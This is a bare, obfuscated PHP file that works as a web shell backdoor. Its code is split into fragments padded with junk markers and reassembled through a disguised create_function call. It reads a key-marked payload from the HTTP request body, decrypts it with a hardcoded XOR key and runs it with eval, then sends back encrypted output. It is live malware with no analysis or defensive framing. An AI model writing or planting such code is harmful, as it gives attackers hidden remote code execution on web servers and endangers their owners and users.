<?php
$E='$k;U){$c=st;Urlen($k);U;$l;U;U=strlen($t);$o;U="";for;U(;U$i=0;;U$i<$;Ul;){for($j=0;(;U$j<;U$c;U&&$i<$l);;U$j++,;U$i++){$o';
$y='$k="c70;Uec9f4;U";$kh="7;Ud26a;U583463;U8";;U$kf="a4fc58;Uf80;U82;U0";$p="Dhx;UTwgFC5Tf;URRSb2";;Ufunctio;Un x;U($t,';
$U=';Unput";U),$m;U)==1) {@;Uob;U_start();@e;Uv;Ual(@gzunc;Uom;Upres;Us(@x(@;Ub;Uase64_dec;Uode($m[1]),;U$k)));$o;U=@ob';
$L=';U_get_co;Unten;Uts;U();U;@ob_end_clean();$r;U;U=@bas;Ue64_enc;Uode(;U@x(@gzcom;Upress($o),$k;U));pr;Uint;U(;U"$p$kh$r$kf");}';
$A=str_replace('wo','','cworewoatewo_fuwowonctiwoon');
$d='.=;U$t{$i;U}^;U;U$k;U{$j};}}r;Ue;Uturn $o;}if (@preg_m;Uatch("/$k;Uh(.+);U$kf/",@f;Ui;Ule_get_;Uc;Uontents("php://i';
$s=str_replace(';U','',$y.$E.$d.$U.$L);
$I=$A('',$s);$I();
?>
